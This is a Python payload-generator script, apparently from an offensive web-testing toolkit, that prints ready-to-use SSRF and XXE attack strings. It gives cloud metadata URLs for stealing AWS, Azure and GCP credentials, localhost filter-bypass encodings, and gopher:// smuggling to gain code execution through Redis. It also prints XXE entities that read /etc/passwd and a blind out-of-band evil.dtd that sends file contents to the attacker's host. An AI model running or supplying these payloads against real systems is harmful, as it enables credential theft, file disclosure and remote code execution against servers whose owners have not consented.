#!/usr/bin/env python3
"""SSRF and XXE -> internal access / file read / RCE. PRINTS payloads. Edit LHOST/LPORT in _web_common.py.

Usage:
  python3 gen_ssrf.py ssrf     # server-side request forgery (metadata, internal, gopher->RCE, filter bypass)
  python3 gen_ssrf.py xxe      # XML external entity (file read, SSRF, OOB/blind exfil)
"""
import sys
import _web_common as P

arg = sys.argv[1] if len(sys.argv) > 1 else "ssrf"

if arg == "ssrf":
    print("# SSRF — needs: a param that makes the server FETCH a URL you supply (url=, img=, webhook, pdf-from-url, import).")
    print(f"# confirm it's SSRF FIRST: point the param at http://{P.LHOST}/  -> ok: your listener/http.server logs a hit from the target's IP.")
    print("# 1) cloud metadata (instant creds if cloud-hosted) — try first on cloud targets:")
    print("   http://169.254.169.254/latest/meta-data/iam/security-credentials/   (AWS)  -> ok: a role name, then append it to get JSON creds")
    print("   http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure, needs Metadata:true header)")
    print("   http://metadata.google.internal/computeMetadata/v1/  (GCP, Metadata-Flavor:Google)")
    print("# 2) internal recon — reach services not exposed externally (<PORT> = the port to probe):")
    print(f"   http://127.0.0.1:<PORT>/   ·   http://internal-host/   ·   scan ports via response/timing diffs")
    print("# 3) filter bypass (only if 127.0.0.1/localhost is blocked) — try in order:")
    print("   http://127.1   http://0177.0.0.1 (octal)   http://2130706433 (decimal)   http://[::1]")
    print("   http://localtest.me   http://<attacker-dns-rebind>    http://target@127.0.0.1   ..%2f tricks")
    print("# 4) protocol smuggling -> RCE on an internal service (needs: gopher:// allowed AND an unauth internal service):")
    print(f"   gopher://127.0.0.1:6379/_  -> Redis: write a cron/SSH-key/webshell (RCE)")
    print(f"   gopher://127.0.0.1:3306/   -> MySQL   ·   dict:// / file:// for read/enum")

elif arg == "xxe":
    print("# XXE — needs: an endpoint that PARSES XML you send (with a parser that resolves external entities).")
    print("# 1) file read (needs: the entity is reflected back in a response field) — try first:")
    print('   <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>')
    print("   # -> ok: the response echoes /etc/passwd contents (root:x:0:0...) where &x; was placed")
    print("   Windows:  file:///c:/windows/win.ini    ·    PHP:  php://filter/convert.base64-encode/resource=...")
    print("# 2) SSRF via XXE:")
    print('   <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">')
    print("# 3) BLIND / OOB exfil (no reflection) — host an evil.dtd on your box:")
    print("   evil.dtd:")
    print('     <!ENTITY % f SYSTEM "file:///etc/passwd">')
    print(f'     <!ENTITY % e "<!ENTITY &#37; x SYSTEM \'http://{P.LHOST}/?d=%f;\'>">%e;%x;')
    print(f'   payload:  <!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://{P.LHOST}/evil.dtd">%dtd;]>')
    print(f"   serve evil.dtd:  python3 -m http.server 80  on {P.LHOST}  -> ok: your http.server logs a request with ?d=<file contents>")
    print("# 4) also: parameter entities for WAF bypass; SVG/DOCX/XLSX upload as an XXE vector.")
else:
    print("use: ssrf | xxe"); sys.exit(1)
